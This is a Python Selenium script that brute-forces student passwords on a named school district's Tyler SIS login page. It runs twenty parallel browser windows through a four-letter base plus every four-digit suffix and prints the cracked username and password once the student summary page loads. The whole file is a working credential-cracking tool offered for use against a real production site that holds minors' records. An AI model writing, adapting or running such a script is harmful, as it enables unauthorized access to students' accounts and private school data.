#gets the libraries required for functions used in this program
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from timeit import default_timer as timer
from selenium import webdriver
import time

# Works for any RP student class, as long as four-letter base is known

#Collect user input, used as parameters during brute force
name = input("enter username here(first.last###): ")
base = input("Enter password base either bike, best, or rp 21:")
start = timer()

i = 0
browserDict = {}
numDict = {}
numToUse = str(0000).zfill(4)
breakWhileLoop = False

#Create twenty chrome browser isntances, doing this allows computer to test iteration, while other windows are refreshing
while i < 20:
    #may need to replace the executable path with the correct destination on your computer
    browserDict[i] = webdriver.Chrome(executable_path=r"chromedriver.exe")#sets the webdriver to open the browser

    browserDict.get(i).get('https://sdm.sisk12.com/RP360x3/login') #opens tyler sis in google chrome

    time.sleep(1.5) #this is a pause to ensure that the site loads fully
    student = browserDict.get(i).find_element_by_id("mat-tab-label-0-2")#finds the student tab inside the browser
    student.click()#clicks on the student tab

    numDict[i] = numToUse #Set the starting integer for each window
    numToUse = int(numToUse) + 500 #Increment numToUse by 500 so each browser tests 500 passwords
    i += 1 #Increment int to move on to next iteration of loop

j = 0
while j < 500:
    j += 1
    for key in browserDict:

        browser = browserDict[key] #Set the current browser to the one to test

        #conditional to test if the password is cracked
        if browser.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
            numDict[key] = int(numDict[key]) - 1 #This gets the user password, currently one excess set of iterations occur before the solution is caught
            end = timer() #The password is cracked so timer can be stopped

            print("The username is " + name) #Log the username
            print("The password is:" + base + str(numDict[key]).zfill(4)) #Log the password
            print("The program took " + str(int(end) - int(start)) + " seconds to finish") #Log the time to complete

            breakWhileLoop = True #Causes program to breaks out of upper while loop
            break #Break out of current loop

        username = browser.find_element_by_id("txtUserName") #sets focus on the username text input box
        password = browser.find_element_by_id("txtPassword") #sets focus on the password text input box

        username.clear() #removes any text the username box
        username.send_keys(name) #inputs the username inputed earlier

        password.clear() #removes any text the password box
        password.send_keys(base + str(numDict[key]).zfill(4)) #inputs the current password attempt
        password.send_keys(Keys.RETURN) #presses enter to submit the info to tylersis

        numDict[key] = int(numDict[key]) + 1 #goes to the next password
        
        print(base + str(numDict[key]).zfill(4)) #prints the current password attempt for troubleshooting and to look like one of those cool movie hackers
    if breakWhileLoop:
        break

#Close all the browsers except cracked one
for key in browserDict:
    browser = browserDict[key]
    if browser.current_url == ("https://sdm.sisk12.com/RP360x3/login"):
        browser.close()